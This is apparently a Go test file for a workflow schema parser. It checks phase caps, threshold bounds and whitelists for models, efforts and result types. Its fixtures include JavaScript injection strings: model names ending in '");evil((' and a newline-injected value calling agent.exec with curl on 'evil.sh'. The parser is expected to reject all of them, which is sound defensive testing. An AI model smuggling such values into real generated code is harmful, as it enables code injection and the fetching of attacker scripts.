package workflow

import (
	"fmt"
	"strings"
	"testing"
)

// phasesJSON builds a schema with n minimally-valid phases (id only) for cap tests.
func phasesJSON(n int) []byte {
	parts := make([]string, n)
	for i := range parts {
		parts[i] = fmt.Sprintf(`{"id":"p%d"}`, i)
	}
	return []byte(`{"phases":[` + strings.Join(parts, ",") + `]}`)
}

// TestParseSchema_PhaseCountCap locks the MaxPhases fail-closed boundary: a phase
// count above MaxPhases is rejected at the parse boundary (so the team generator's
// string(rune('A'+segmentIndex)) segment labels can never leave the A..Z charset),
// while a count at the cap parses.
func TestParseSchema_PhaseCountCap(t *testing.T) {
	t.Parallel()
	if _, err := ParseSchema(phasesJSON(MaxPhases + 1)); err == nil {
		t.Fatalf("expected %d phases (> cap %d) to be rejected", MaxPhases+1, MaxPhases)
	} else if !strings.Contains(err.Error(), "exceeds cap") {
		t.Fatalf("error must name the cap, got: %v", err)
	}
	if _, err := ParseSchema(phasesJSON(MaxPhases)); err != nil {
		t.Fatalf("%d phases (== cap) should parse: %v", MaxPhases, err)
	}
}

// TestParseSchema_CoverageThresholdBounds locks S15: coverage_threshold is a
// percentage; values outside 0..100 are rejected at the parse boundary with an
// error naming the field, while a valid in-range value (and 0 = unset) parses.
func TestParseSchema_CoverageThresholdBounds(t *testing.T) {
	t.Parallel()
	overRange := []byte(`{"phases":[{"id":"testing","coverage_threshold":150}]}`)
	_, err := ParseSchema(overRange)
	if err == nil {
		t.Fatal("expected coverage_threshold 150 to be rejected")
	}
	if !strings.Contains(err.Error(), "coverage_threshold") {
		t.Fatalf("error must name coverage_threshold, got: %v", err)
	}

	valid := []byte(`{"phases":[{"id":"testing","coverage_threshold":85}]}`)
	if _, err := ParseSchema(valid); err != nil {
		t.Fatalf("coverage_threshold 85 should parse: %v", err)
	}

	unset := []byte(`{"phases":[{"id":"planning","coverage_threshold":0}]}`)
	if _, err := ParseSchema(unset); err != nil {
		t.Fatalf("coverage_threshold 0 (unset) should parse: %v", err)
	}

	negative := []byte(`{"phases":[{"id":"testing","coverage_threshold":-1}]}`)
	if _, err := ParseSchema(negative); err == nil {
		t.Fatal("expected negative coverage_threshold to be rejected")
	}
}

// TestParseSchema_RejectsInjectionModel locks SPEC-FABLE5-001 S2: a model string
// carrying JS breakout characters is rejected at the parse boundary before it
// can reach the generated workflow JS.
func TestParseSchema_RejectsInjectionModel(t *testing.T) {
	t.Parallel()

	for _, model := range []string{
		"claude-opus-5\");evil((",
		"claude-opus-4-8\");evil((",
		"claude-fable-5-1\");evil((",
		"claude-fable-5\");evil((",
		"fable\nawait evil()",
	} {
		model := model
		t.Run(model, func(t *testing.T) {
			data := []byte(fmt.Sprintf(`{"phases":[{"id":"planning","model":%q}]}`, model))
			if _, err := ParseSchema(data); err == nil {
				t.Fatalf("expected unsafe-model rejection for %q", model)
			}
		})
	}
}

// TestParseSchema_RejectsNonEnumEffort locks the effort whitelist boundary.
func TestParseSchema_RejectsNonEnumEffort(t *testing.T) {
	t.Parallel()
	data := []byte(`{"phases":[{"id":"planning","effort":"ultra"}]}`)
	if _, err := ParseSchema(data); err == nil {
		t.Fatal("expected non-enum effort rejection")
	}
}

// TestParseSchema_RejectsUnsafeResultType locks the verdict_source whitelist:
// result_type is interpolated into a single-line comment in the generated JS,
// so a newline-bearing value (which would terminate the comment and emit an
// executable statement) must be rejected at the parse boundary.
func TestParseSchema_RejectsUnsafeResultType(t *testing.T) {
	t.Parallel()
	newlineInjection := []byte(`{"phases":[{"id":"gate_build_test","verdict_source":"exit_code';\nawait agent.exec(['curl','evil.sh']);\n//"}]}`)
	if _, err := ParseSchema(newlineInjection); err == nil {
		t.Fatal("expected unsafe result_type (newline injection) rejection")
	}
	nonEnum := []byte(`{"phases":[{"id":"gate_build_test","result_type":"llm_judge"}]}`)
	if _, err := ParseSchema(nonEnum); err == nil {
		t.Fatal("expected non-enum result_type rejection")
	}
	valid := []byte(`{"phases":[{"id":"gate_build_test","verdict_source":"exit_code"}]}`)
	if _, err := ParseSchema(valid); err != nil {
		t.Fatalf("valid exit_code result_type should parse: %v", err)
	}
}

func TestIsSafeAgentModel(t *testing.T) {
	t.Parallel()
	cases := map[string]bool{
		"":                           true,
		"claude-opus-5-5":            true,
		"claude-opus-5":              true,
		"claude-opus-4-8":            true,
		"claude-sonnet-5-5":          true,
		"claude-sonnet-5":            true,
		"claude-sonnet-4-6":          true,
		"claude-haiku-4-5":           true,
		"claude-fable-5-1":           true,
		"claude-fable-5":             true,
		"fable":                      true,
		"best":                       true,
		"gpt-4":                      false,
		"claude-opus-5\");evil((":    false,
		"claude-opus-4-8\");evil((":  false,
		"claude-fable-5-1\");evil((": false,
		"claude-fable-5\");evil((":   false,
		"fable\nawait evil()":        false,
	}
	for in, want := range cases {
		if got := isSafeAgentModel(in); got != want {
			t.Errorf("isSafeAgentModel(%q) = %v, want %v", in, got, want)
		}
	}
}

func TestIsSafeEffort(t *testing.T) {
	t.Parallel()
	if got := len(safeEfforts); got != 5 {
		t.Fatalf("safeEfforts has %d values, want exactly 5", got)
	}
	cases := map[string]bool{
		"":          true,
		"low":       true,
		"medium":    true,
		"high":      true,
		"xhigh":     true,
		"max":       true,
		"ultra":     false,
		"ultracode": false,
		"HIGH":      false,
	}
	for in, want := range cases {
		if got := isSafeEffort(in); got != want {
			t.Errorf("isSafeEffort(%q) = %v, want %v", in, got, want)
		}
	}
}
